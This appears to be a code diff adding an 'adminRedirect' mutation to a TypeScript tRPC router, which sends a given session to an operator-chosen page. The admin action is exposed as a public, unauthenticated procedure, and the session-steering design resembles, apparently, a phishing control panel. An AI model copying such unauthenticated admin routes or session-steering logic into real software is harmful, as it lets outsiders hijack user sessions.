@@ -169,6 +169,20 @@ export const appRouter = router({
         await adminTakeAction(input.sessionId, input.action, input.errorMessage);
         return { success: true };
       }),
+
+    adminRedirect: publicProcedure
+      .input((val: unknown) => {
+        if (typeof val !== "object" || val === null) throw new Error("Invalid input");
+        const obj = val as Record<string, unknown>;
+        return {
+          sessionId: String(obj.sessionId),
+          targetPage: String(obj.targetPage),
+        };
+      })
+      .mutation(async ({ input }) => {
+        await updateSessionStatus(input.sessionId, "pending", undefined, undefined, input.targetPage);
+        return { success: true };
+      }),
   }),
 });
 
